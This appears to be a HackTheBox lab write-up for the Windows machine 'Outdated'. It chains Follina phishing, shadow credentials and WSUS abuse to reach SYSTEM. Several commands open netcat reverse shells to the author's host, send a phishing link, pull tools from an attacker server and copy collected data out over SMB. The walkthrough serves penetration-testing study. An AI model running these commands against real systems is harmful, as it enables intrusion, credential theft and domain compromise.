---
title: "HTB - Outdated (Medium | Windows | Active Directory)"
date: 2026-10-05 12:00:00 +0000
categories: [HackTheBox, Active Directory]
tags: [htb, windows, active-directory, nxc, netexec, smb, smbclient, cve-2022-30190, swaks, sharphound, bloodhound, addkeycredentiallink, shadow-credentials, whisker, rubeus, evil-winrm, wsus, sharpwsus]
description: "Phish a Follina doc (CVE-2022-30190) via swaks for a foothold, BloodHound finds a shadow-credentials path (AddKeyCredentialLink) abused with Whisker/Rubeus, then WSUS abuse via SharpWSUS to SYSTEM"
image:
  path: /assets/img/outdated.png
---


## Recon

```bash
nmap -p- -sSCV --open --min-rate 5000 <target>
```

```bash
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-07 20:32:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2026-10-07T20:20:04
|_Not valid after:  2027-10-07T20:20:04
|_ssl-date: 2026-10-07T20:34:20+00:00; +7h59m59s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-07T20:34:21+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2026-10-07T20:20:04
|_Not valid after:  2027-10-07T20:20:04
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-07T20:34:21+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2026-10-07T20:20:04
|_Not valid after:  2027-10-07T20:20:04
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-07T20:34:20+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2026-10-07T20:20:04
|_Not valid after:  2027-10-07T20:20:04
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8530/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
| http-methods: 
|_  Potentially risky methods: TRACE
8531/tcp  open  unknown
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49963/tcp open  msrpc         Microsoft Windows RPC
49967/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-10-07T20:33:38
|_  start_date: N/A
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

### Service Discovery Analysis

The Nmap scan reveals a Windows Active Directory Domain Controller with a notable addition: **ports 8530/8531**, the default ports for **WSUS (Windows Server Update Services)**. This instantly flags this box as a WSUS-related attack — WSUS running over plain HTTP (port 8530, not the TLS-wrapped 8531) is a well-known vector for machine-in-the-middle update poisoning (WSUS abuse / "WSUXploit"-style attacks), since updates served over HTTP can be tampered with to deliver a malicious payload disguised as a legitimate update.

Other services:

- **SMTP (Port 25)**: hMailServer — a mail server, named `mail.outdated.htb`. Worth checking for user enumeration (VRFY/EXPN) and open relay misconfigurations
- **Full AD stack**: Kerberos (88), LDAP (389/636/3268/3269), SMB (445), kpasswd (464) — standard Domain Controller services
- **WinRM (Port 5985)**: Remote management, viable once credentials are obtained
- **Large clock skew** (+7h59m59s): will require `faketime`/`ntpdate` sync for any Kerberos-based tooling

Domain: outdated.htb Hostname: DC Mail hostname: mail.outdated.htb

The combination of WSUS on HTTP plus a separate mail server hints at a two-stage attack: likely user/credential discovery via SMTP enumeration, followed by a WSUS man-in-the-middle to push a malicious "update" for code execution or privilege escalation.

We add the domain to /etc/hosts:

```bash
echo "<target> outdated.htb DC.outdated.htb mail.outdated.htb" | sudo tee -a /etc/hosts
```

---

## User

Port 445 in this context typically indicates the service SMB - Server Message Blocks, which essentially is a way to share files or other resources across a network. To enumerate SMB, we can use tools such as netexec, the latter of which shows us the shares hosted on the target machine.

```bash
nxc smb outdated.htb -u 'guest' -p '' --shares
```

![](/assets/img/outdated/Pasted_image_20261007093900.png)

Among a few defaults, the Shares share seems to be the most uncommon, so we look at that first.

```bash
smbclient -N //<target>/Shares
```

![](/assets/img/outdated/Pasted_image_20261007094020.png)

We find a PDF file within, which we can download to our local system using the get command. The document appears to be an internal memo referring to unpatched vulnerabilities on the target system.

![](/assets/img/outdated/Pasted_image_20261007094103.png)

Moreover, the email address itsupport@outdated.htb is alluded to, which is particularly interesting since the first vulnerability mentioned in the document is CVE-2022-30190, also known as Follina, a recent exploit on MS word/rtf docs, which is in part exploitable through email. The vulnerability is based on the Microsoft Support Diagnostics Tool - MSDT, which can be used to download malicious files via an embedded link. With that in mind, we can now proceed to gaining a foothold on the machine.

### CVE-2022-30190 (Follina)

**Overview**

Follina exploits how Microsoft Office handles remote template links combined with the `ms-msdt:` URI scheme. A malicious Word/RTF document references an external HTML file via Office's remote template feature; when opened (sometimes even via Preview Pane, no macros required), Office fetches that HTML, which in turn invokes the Microsoft Support Diagnostic Tool (MSDT) through a crafted URI. MSDT then executes attacker-supplied PowerShell code — all without triggering macro security warnings, since no macro is ever used. The flaw was especially dangerous because it bypassed the usual "Protected View"/macro-prompt defenses entirely.

While it is not too difficult to forge our own PoC for this CVE, there are already some repositories on GitHub that have done this task for us; we opt for msdt-follina, by John Hammond. Concisely, the Python script creates and hosts a webserver in the /tmp directory, with a malicious index.html file. The HTML file must be at least 4096 bytes for the exploit to work, which is why it is filled with gibberish among the actual payload.

We need to change line 111 to point to our local webserver hosting the nc64.exe binary

![](/assets/img/outdated/Pasted_image_20261007094431.png)

Once this is done, we can run the script, making sure to specify the correct interface (OpenVPN uses tun0), as well as a port to host the webserver with the malicious HTML file, and lastly also a port to listen on for the reverse shell

```bash
python3 follina.py --interface tun0 --port 80 --reverse 4444
```

We also start up an HTTP server of our own in the same directory as the nc64.exe binary:

```bash
python3 -m http.server 9090
```

Once that is done, we need to send an email to the IT account, which will trigger our payload and get us RCE. We can do that using a tool called swaks:

```bash
swaks --to itsupport@outdated.htb --from car@melo --server mail.outdated.htb --body "http://10.10.16.65/"
```

![](/assets/img/outdated/Pasted_image_20261007094706.png)

We now have a shell as btables.

![](/assets/img/outdated/Pasted_image_20261007094718.png)

### Lateral Movement

As btables, we can now proceed to enumerate Active Directory using SharpHound. We download the latest build, and upload it to the target machine using a Python HTTP server locally, and iwr on the target box. On our reverse shell, we first upgrade the cmd shell into a PowerShell, and then use the following command to download SharpHound.exe from our Python server and save it as sh.exe

```bash
powershell.exe
iwr http://10.10.16.65:7070/SharpHound.exe -o sh.exe
```

![](/assets/img/outdated/Pasted_image_20261007095111.png)

We let SharpHound do some enumeration, and can then find the results in the same directory as the binary.

```bash
.\sh.exe -C All
```

![](/assets/img/outdated/Pasted_image_20261007095350.png)

In order to exfiltrate our files without worrying about size limitations, we can use the existing infrastructure and host an SMB share on our local machine, using the impacket suite:

```bash
impacket-smbserver share . -smb2support -user user -password pass
```

We can then mount the share on the target machine and move any subsequent files in there for exfiltration.

```bash
net use z: \\10.10.16.65\share /user:user pass 
copy 20261007135215_BloodHound.zip z:
```

![](/assets/img/outdated/Pasted_image_20261007100329.png)

What this diagram essentially shows us is that btables belongs to the itstaff group, which has the privilege to AddKeyCredentialLink to the user we need to pivot to, namely sflowers. In turn, sflowers has PSRemote access to the Domain Controller. We can pivot to sflowers using the ShadowCredentials method, in which we leverage the msDS-KeyCredentialLink attribute between the itstaff group and sflowers.

### Shadow Credentials Attack (AddKeyCredentialLink)

**Overview**

The Shadow Credentials attack abuses `GenericWrite`/`AddKeyCredentialLink`-style rights over an account's `msDS-KeyCredentialLink` attribute. This attribute normally stores public keys used for Windows Hello for Business / passwordless authentication. If an attacker can write to it, they can add their own attacker-controlled public key to the victim's account, then use the matching private key to request a Kerberos TGT via PKINIT — authenticating as that user without ever knowing or resetting their password. Unlike a password reset, this technique is far stealthier since it doesn't lock the legitimate user out or trigger a password-change event.

We can do this using a tool called Whisker, which instead of compiling ourselves, we can decompress directly onto the target machine, using the PowerSharpPack repository. Firstly, we get a local copy of the Invoke-Whisker.ps1 PowerShell script, and host it on a Python HTTP server. We then access that script from the target machine, which allows us to use a fully functional version of Whisker:

```powershell
copy \\10.10.16.65\smbFolder\Invoke-Whisker.ps1
```

We then use the tool to target the sflowers user. The methodology underlying the Shadow Credentials attack is vast, but is nicely condensed into this blogpost. Simply put, Whisker is about to add our own set of credentials - in the form of public/private keys - to sflowers, with which we can then go on to completely pivot onto that user

```powershell
Import-Module .\Invoke-Whisker.ps1
Invoke-Whisker -command "add /target:sflowers"
```

![](/assets/img/outdated/Pasted_image_20261007101121.png)

The final section of the condensed output is a Rubeus command, which uses the certificate Whisker just generated to request a valid Kerberos TGT for sflowers via PKINIT.

**Note:** this is the Shadow Credentials attack completing itself — requesting a TGT with a planted certificate — not a Golden Ticket attack. A Golden Ticket forges TGTs using the domain's `krbtgt` account hash and requires that hash to already be compromised; here we're simply authenticating as sflowers with the certificate we just planted on her account.

We proceed by uploading the Rubeus binary

```powershell
.\Rubeus.exe asktgt /user:sflowers /certificate:MIIJuAIBAzCC... /password:"Fw1QSR5B5n7WLlR6" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
```

![](/assets/img/outdated/Pasted_image_20261007101951.png)

The final part of the output is the NTLM hash for the sflowers user. NTLM stands for New Technology Lan Manager, and is a security protocol used to authenticate users. Possession of this hash essentially gives us full access over the underlying user, which we can leverage using evil-winrm, which is pre-installed on most penetration-testing distributions.

```bash
evil-winrm-py -i dc.outdated.htb -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5
```

![](/assets/img/outdated/Pasted_image_20261007102112.png)

We have now successfully pivoted to sflowers, with the flag located at C:\Users\sflowers\Desktop\user.txt.

---

## Root

As we found out during our initial enumeration, WSUS is running on the target machine, and as a quick whoami command reveals, the user sflowers is part of the WSUS group

```bash
whoami /groups
```

![](/assets/img/outdated/Pasted_image_20261007102214.png)

We can locate the server by querying the following registry key:

```bash
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
```

![](/assets/img/outdated/Pasted_image_20261007102249.png)

We can see the server running on non-SSL HTTP, under the domain wsus.outdated.htb. We then query the subsequent registry key returned by our initial query, to check whether UseWUServer is set to 1 and verify that the service is in fact active

```bash
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
```

![](/assets/img/outdated/Pasted_image_20261007102315.png)

### WSUS Abuse via SharpWSUS

**Overview**

WSUS (Windows Server Update Services) distributes Windows updates internally so clients don't pull them directly from Microsoft. When WSUS is configured over **plain HTTP** (not HTTPS), there is no cryptographic protection on the update metadata/binaries in transit, and more importantly, any account with sufficient rights over the WSUS server (such as membership in a WSUS management group) can register and approve **arbitrary, attacker-created "updates"**. Since clients trust whatever their configured WSUS server approves and pushes, an attacker who controls update approval can deliver and execute any binary they want on every machine that checks in — including the Domain Controller itself, as SYSTEM.

With that in mind, we will now attempt to attack this service using SharpWSUS, which will leverage this group membership to inject a malicious WSUS update. Conveniently, the tool is also hosted in the aforementioned PowerSharpPack repository, saving us the trouble of having to compile it ourselves on a Windows system.

```bash
#1
upload /home/kali/Hackthebox/Machines/Outdated/compiled_binaries/SharpWSUS.exe .

#2
start-process .\nc64.exe -args "-e cmd.exe 10.10.16.65 4444"
```

```bash
nc -lnvp 4444
```

![](/assets/img/outdated/Pasted_image_20261007103143.png)

We are now ready to start exploiting WSUS. Following along with the aforementioned blogpost, we find a section that covers Lateral movement using psexec, a binary which is also found in sflowers' Desktop directory. The following command creates a malicious WSUS update, whose payload is a Netcat reverse shell.

```bash
SharpWSUS.exe create /payload:"C:\users\sflowers\Desktop\PsExec64.exe" /args:"-accepteula -s -d c:\\programdata\\nc64.exe -e cmd.exe 10.10.16.65 9999" /title:"pwned"
```

![](/assets/img/outdated/Pasted_image_20261007103309.png)

We also find the next commands we need to run in the tail of the output. We must first approve the update before our payload is triggered. We set up our listener on port 9001 in anticipation, and run the next command, making sure to correctly set the computername and groupname parameters.

```bash
SharpWSUS.exe approve /updateid:53a94301-d192-4503-8ede-e01b1944d3c2 /computername:dc.outdated.htb /groupname:"pwned"
```

![](/assets/img/outdated/Pasted_image_20261007103731.png)

![](/assets/img/outdated/Pasted_image_20261007103754.png)

The final flag can be found at C:\Users\Administrator\Desktop\root.txt.

---

### Summary

**Attack Chain:**

1. **SMB Enumeration** → Null session (`guest`) revealed shares; the `Shares` share held a PDF memo listing unpatched vulnerabilities and an IT support email address
2. **CVE-2022-30190 (Follina)** → Hosted a malicious HTML/RTF payload and emailed a link to `itsupport@outdated.htb` via `swaks`, triggering MSDT-based remote code execution and landing a shell as `btables`
3. **BloodHound Enumeration** → Uploaded SharpHound, exfiltrated results via a self-hosted Impacket SMB share, found `btables` → `itstaff` group → `AddKeyCredentialLink` over `sflowers` → `sflowers` has PSRemote on the DC
4. **Shadow Credentials Attack** → Used Whisker to plant an attacker-controlled certificate on `sflowers`' `msDS-KeyCredentialLink`
5. **PKINIT TGT Request** → Used Rubeus with the planted certificate to request a TGT and NTLM hash for `sflowers` (not a Golden Ticket — no krbtgt hash involved)
6. **User Shell** → Authenticated via evil-winrm using `sflowers`' NTLM hash, captured user.txt
7. **WSUS Group Discovery** → `whoami /groups` showed `sflowers` is a member of a WSUS management group
8. **WSUS Configuration Recon** → Registry queries confirmed WSUS running over plain HTTP and actively enforced (`UseWUServer=1`)
9. **Malicious Update Creation** → Used SharpWSUS to craft a fake update that drops and executes PsExec with a reverse shell payload
10. **Update Approval & Execution** → Approved the malicious update for the DC's computer group, triggering execution as SYSTEM on the Domain Controller, captured root.txt

